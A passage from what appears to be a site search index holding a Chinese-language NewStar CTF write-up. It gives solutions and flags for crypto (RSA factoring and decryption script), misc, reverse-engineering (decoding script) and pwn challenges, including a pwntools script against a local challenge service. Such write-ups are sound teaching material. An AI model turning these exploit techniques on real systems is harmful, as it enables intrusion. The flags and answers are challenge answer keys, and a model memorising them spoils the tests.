52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153\n#c=48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069\n</code></pre> \u6254\u8fdbfactordb\u4e2d\u79d2\u4e86\u5206\u89e3\uff0c\u7136\u540e\u5957\u516c\u5f0f <pre><code>from Crypto.Util.number import *\n# 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153\nc=48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069\np=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421\nq=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093\ne=0x10001\nphi=(p-1)*(q-1)\nd=inverse(e,phi)\nprint(long_to_bytes(pow(c,d,p*q)))\n</code></pre></p> <p>flag{9cd4b35a-affc-422a-9862-58e1cc3ff8d2}</p>"},{"location":"new_star_writeup/#misc","title":"misc","text":""},{"location":"new_star_writeup/#labyrinth","title":"Labyrinth","text":"<p>https://aperisolve.com</p> <p>\u4e00\u628a\u68ad </p> <p>flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}</p>"},{"location":"new_star_writeup/#whereisflag","title":"WhereIsFlag","text":"<p> \u5728proc\u4e2d\u627e\u5230\u4e86</p> <p>flag{nEW5T4R_cTF_20242e2c752e8737}</p>"},{"location":"new_star_writeup/#pleasingmusic","title":"pleasingMusic","text":"<p>\u6839\u636e\u63d0\u793a\uff0c\u5c06\u5176\u53cd\u8fc7\u6765\u5c31\u53ef\u4ee5\u4e86\uff0c\u7136\u540e\u770b\u97f3\u8f68\uff0c\u5bf9\u5e94morse\u7535\u7801</p> <p>\u00b7 --\u00b7\u00b7 \u00b7\u00b7--\u00b7- -- --- \u00b7-\u00b7 \u00b7\u00b7\u00b7 \u00b7 \u00b7\u00b7--\u00b7- -\u00b7-\u00b7 --- -\u00b7\u00b7 \u00b7</p> <p>EZ_MORSE_CODE</p> <p>flag{EZ_MORSE_CODE}</p>"},{"location":"new_star_writeup/#_2","title":"\u5151\u6362\u7801","text":"<p>C:\\Program Files\\Java\\jdk-22\\bin&gt;java -jar \"C:\\Program Files\\Stegsolve.jar\" \u5931\u8d25 \u4fee\u6539\u957f\u5bbd\u9ad8\u8bd5\u8bd5\uff0c\u5f97\u5230flag  flag{La_vaguelette}</p>"},{"location":"new_star_writeup/#re","title":"re","text":""},{"location":"new_star_writeup/#simple_encryption","title":"Simple_encryption","text":"<p> \u975e\u5e38\u7b80\u5355\uff0c\u5199\u4e2a\u811a\u672c\u79d2\u4e86 <pre><code>def res(a,i):\n    if(i%3==0):\n        return a+31\n    elif(i%3==1):\n        return a-41\n    elif(i%3==2):\n        return a^0x55\n    else :\n        return 0\ntext=[]\n\nbuffer=[0x47, 0x95, 0x34, 0x48, 0xA4, 0x1C, 0x35, 0x88, 0x64, 0x16, 0x88, 0x07, 0x14, 0x6A, 0x39, 0x12, 0xA2, 0x0A, 0x37, 0x5C, 0x07, 0x5A, 0x56, 0x60, 0x12, 0x76, 0x25, 0x12, 0x8E, 0x28]\nfor i in range (len(buffer)):\n    text.append(res(buffer[i],i))\n\nflag=\"\"\nfor i in range(len(text)):\n    flag+=chr((text[i]))\nprint(flag)\n</code></pre></p> <p>flag{IT_15_R3Al1y_V3Ry-51Mp1e}</p>"},{"location":"new_star_writeup/#base64","title":"base64","text":"<p> \u6362\u8868base64\uff0c\u79d2\u4e86 </p> <p>flag{y0u_kn0w_base64_well}</p>"},{"location":"new_star_writeup/#begin","title":"begin","text":"<p>\u975e\u5e38\u597d\u7684\u9898\u76ee\uff0c\u6559\u4eba\u5982\u4f55\u7528IDA \u544a\u8bc9\u6211\u4eec shift+F12\u53ef\u4ee5\u67e5\u770bstring\uff0c\u800c\u53d8\u91cf\u6216\u8005\u51fd\u6570\u52a0x\u53ef\u4ee5\u770b\u5230\u5f15\u7528</p> <p>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</p>"},{"location":"new_star_writeup/#pwn","title":"pwn","text":""},{"location":"new_star_writeup/#game","title":"game","text":"<p>\u6e90\u4ee3\u7801\u7684\u610f\u601d\u662f\u6bcf\u6b21\u8f93\u5165\u4e00\u4e2a\u4e2a\u4f4d\u6570\uff0c\u4e94\u79d2\u5185\u8f93\u5230\u5927\u4e8e999\u5373\u53ef\uff0cexp\u5982\u4e0b <pre><code>from pwn import *\np=remote('127.0.0.1',45393)\n#p=process(\"./pwn\")\ncontext.log_level='DEBUG'\nfor i in range(112):\n\n    p.sendline(b\"9\")\np.interactive()\n</code></pre></p>"},{"location":"new_star_writeup/#real-login","title":"real login","text":"<p>\u771f\u7684\u662f\u7b7e\u5230\uff0c\u8f93\u5165NewStar!!!\u5c31\u53ef\u4ee5\u62ffshell</p>"},{"location":"note/","title":"Class note","text":""}]}